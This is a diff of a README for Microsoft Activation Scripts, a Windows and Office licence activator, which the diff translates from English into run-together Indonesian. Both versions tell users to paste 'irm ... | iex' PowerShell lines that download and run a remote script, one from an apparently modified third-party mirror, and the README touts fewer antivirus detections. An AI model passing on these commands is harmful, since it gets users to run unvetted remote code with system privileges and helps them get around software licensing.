@@ -1,67 +1,18 @@
-Microsoft Activation Scripts (MAS)
-A Windows and Office activator using HWID / Ohook / KMS38 / Online KMS activation methods, with a focus on open-source code and fewer antivirus detections.
+Skrip Aktivasi Microsoft (MAS) Aktivator Windows dan Office yang menggunakan metode aktivasi HWID / Ohook / KMS38 / Online KMS, dengan fokus pada kode sumber terbuka dan deteksi antivirus yang lebih sedikit.
 
-Features
-HWID (Digital License) Method: Permanently Activate Windows
-Ohook Method: Permanently Activate Office
-KMS38 Method: Activate Windows/Server Till the Year 2038
-Online KMS Method: Activate Windows/Server/Office For 180 Days (Lifetime With Renewal Task)
-Advanced Activation Troubleshooting
-O
-E
-M
- Folders For Preactivation
-Change Windows Edition
-Check Windows/Office Activation Status
-Available in All In One and Separate Files Versions
-Fully Open Source and Based on Batch Scripts
-Fewer Antivirus Detections
-MAS Latest Release
-Last Release - v2.5 (16-Nov-2023)
+Fitur Metode HWID (Lisensi Digital): Mengaktifkan Windows Secara Permanen Metode Ohook: Mengaktifkan Office Secara Permanen Metode KMS38: Mengaktifkan Windows/Server Hingga Tahun 2038 Metode KMS Online: Mengaktifkan Windows/Server/Office Selama 180 Hari (Seumur Hidup dengan Tugas Pembaruan) Pemecahan Masalah Aktivasi Lanjutan Folder O E M Untuk Pra-aktivasi Ubah Edisi Windows Periksa Status Aktivasi Windows/Office Tersedia dalam Versi Semua dalam Satu dan File Terpisah Sepenuhnya Sumber Terbuka dan Berdasarkan Skrip Batch Deteksi Antivirus yang Lebih Sedikit Rilis Terbaru MAS Rilis Terakhir - v2.5 (16-Nov-2023)
 
-GitHub
-Bitbucket
-Download / How to use it?
-Method 1 - PowerShell (Recommended)
-Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
+Unduh GitHub Bitbucket / Bagaimana cara menggunakannya? Metode 1 - PowerShell (Disarankan) Klik kanan pada menu mulai Windows dan pilih PowerShell atau Terminal (Bukan CMD).
 
-Copy and paste the code below and press enter:
+Salin dan tempel kode di bawah ini dan tekan enter:
 
-irm https://elite.kamrul.us/get | iex
-irm https://massgrave.dev/get | iex
-Follow the on-screen instructions for activation.
+irm https://elite.kamrul.us/get | iex irm https://massgrave.dev/get | iex Ikuti petunjuk di layar untuk aktivasi.
 
-Method 2 - Traditional
-Download the file from GitHub or Bitbucket.
-Right-click on the downloaded zip file and extract it.
-In the extracted folder, find the folder named All-In-One-Version.
-Run the file named MAS_AIO.cmd.
-Follow the on-screen instructions for activation.
-Unattended Mode
-To run the scripts in unattended mode, check here.
+Metode 2 - Tradisional Unduh file dari GitHub atau Bitbucket. Klik kanan pada file zip yang diunduh dan ekstrak. Di folder yang diekstrak, temukan folder bernama All-In-One-Version. Jalankan file bernama MAS_AIO.cmd. Ikuti petunjuk di layar untuk aktivasi. Mode Tanpa Pengawasan Untuk menjalankan skrip dalam mode tanpa pengawasan, periksa di sini.
 
-Activations Summary
-Activation Type	Supported Product	Activation Period
-HWID	Windows 10-11	Permanent
-Ohook	Office	Permanent
-KMS38	Windows 10-11-Server	Till the Year 2038
-Online KMS	Windows / Office	180 Days. Lifetime With Renewal Task
-Modification by nhaolbyte
-Main site created by Massgrave
-All credit goes to Massgrave for the creation of the main site.
+Ringkasan Aktivasi Jenis Aktivasi Produk yang Didukung Periode Aktivasi HWID Windows 10-11 Permanen Ohook Office Permanen KMS38 Windows 10-11-Server Hingga Tahun 2038 Online KMS Windows / Office 180 Hari. Seumur Hidup Dengan Pembaruan Modifikasi Tugas oleh nhaolbyte Situs utama dibuat oleh Massgrave Semua penghargaan diberikan kepada Massgrave untuk pembuatan situs utama.
 
-For more details, refer to the respective activation details in the documentation.
+Untuk detail lebih lanjut, lihat detail aktivasi masing-masing dalam dokumentasi.
 
-Screenshots
-(Screenshots to be inserted here)
-
-https://private-user-images.githubusercontent.com/128359757/313157092-0d1bfe80-8338-4ef0-b110-2d7b69576014.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDkzNjcxODUsIm5iZiI6MTc0OTM2Njg4NSwicGF0aCI6Ii8xMjgzNTk3NTcvMzEzMTU3MDkyLTBkMWJmZTgwLTgzMzgtNGVmMC1iMTEwLTJkN2I2OTU3NjAxNC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjA4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYwOFQwNzE0NDVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hNGU5MzY5NmU2Mjc3ZDFmZDMwY2NmZDNjMDA1ODUwZGM3N2I3ZmZhZjg4MThiNWVmOWNhYTFmNWZkMWMwY2MzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.A_TwyajxSVJ-Ow1oMokZDGjyzeTEbWTgdZl9g0zebAI
-
-
-image
-
-
-image
-
-
-image
+Tangkapan layar (Tangkapan layar akan dimasukkan di sini)
+Follow my instagram nhaol_putra
